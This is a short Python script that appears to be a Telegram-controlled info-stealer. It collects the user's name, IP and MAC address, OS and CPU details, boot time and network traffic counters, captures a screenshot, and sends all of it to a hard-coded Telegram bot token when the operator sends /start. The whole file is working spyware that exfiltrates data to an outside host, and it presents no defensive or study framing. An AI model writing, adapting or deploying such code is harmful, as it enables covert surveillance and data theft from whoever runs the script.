import getpass
import os
import socket
from datetime import datetime
from uuid import getnode as get_mac
import telebot
import psutil
import platform
try:
    import pyautogui
except ImportError:
    print("PyAutoGUI not found. Screenshot functionality will be unavailable.")
    pyautogui = None


bot = telebot.TeleBot("7737860469:AAHAQyrFJTIFl8Oj51pOkZGyMOG1_caA_O8")
start = datetime.now()

name = getpass.getuser()
ip = socket.gethostbyname(socket.getfqdn())
mac = get_mac()
ost = platform.uname()

boot_time = psutil.boot_time()
time = datetime.fromtimestamp(boot_time).strftime('%Y-%m-%d %H:%M:%S')

cpu = psutil.cpu_freq()

net_io = psutil.net_io_counters()
download = net_io.bytes_recv / (10242)
uploads = net_io.bytes_sent / (10242)


try:
    os.chdir(r"/tmp")
except OSError as e:
    @bot.message_handler(commands=['start'])
    def start_message(message):
        bot.send_message(message.chat.id, f"Error: Could not change directory: {e}")
        bot.stop_polling()
    bot.polling()
    raise SystemExit


if pyautogui:
    try:
        screenshot = pyautogui.screenshot()
        screenshot.save("screenshot.jpg")
    except Exception as e:
        print(f"Error capturing screenshot: {e}")


info_text = f"""[================================================]
  Operating System: {ost.system}
  Processor: {ost.processor}
  Username: {name}
  IP adress: {ip}
  MAC adress: {hex(mac)}
  Timezone: {time}
  Download: {download:.2f} MB
  Upload: {uploads:.2f} MB
  Max Frequency: {cpu.max:.2f} MHz
  Min Frequency: {cpu.min:.2f} MHz
  Current Frequency: {cpu.current:.2f} MHz
[================================================]"""


@bot.message_handler(commands=['start'])
def start_message(message):
    try:
        if pyautogui:
            with open("screenshot.jpg", "rb") as uphoto:
                bot.send_photo(message.chat.id, uphoto, caption="Screenshot")

        bot.send_message(message.chat.id, info_text)

        if pyautogui:
            os.remove("screenshot.jpg")
    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred: {e}")
    finally:
        bot.stop_polling()

bot.polling()

end = datetime.now()
workspeed = end - start
print(f"Total execution time: {workspeed}")
